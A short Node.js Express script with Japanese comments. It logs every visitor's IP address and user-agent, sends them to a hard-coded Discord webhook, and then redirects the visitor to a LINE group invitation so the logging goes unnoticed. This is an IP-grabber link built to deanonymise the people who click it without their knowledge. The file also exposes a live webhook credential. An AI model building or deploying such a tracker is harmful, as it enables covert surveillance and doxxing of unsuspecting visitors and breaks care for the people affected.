const express = require('express');
const fetch = require('node-fetch');
const app = express();

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1373359210108162148/eVbwNKiTrvtmHwp4yCkTUuKBIU69CVj7IaqA9qavfYCbFX4IcU6pelTtaCdOf1QJK_Uc'; // 自分のWebhook URLに置き換えてください
const REDIRECT_URL = 'https://line.me/ti/g2/NHsgY4pwGsvy39ZKz6Z5IHpRvPGKW269BKjgcg?utm_source=invitation&utm_medium=link_copy&utm_campaign=default'; // リダイレクト先

app.get('/', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const ua = req.headers['user-agent'];
  const info = {
    content: `アクセス！\nIP: ${ip}\nUA: ${ua}`
  };

  // Discordに通知
  await fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(info),
  });

  // あとはリダイレクト
  res.redirect(REDIRECT_URL);
});

app.listen(3000, () => {
  console.log('Listening on http://localhost:3000');
});
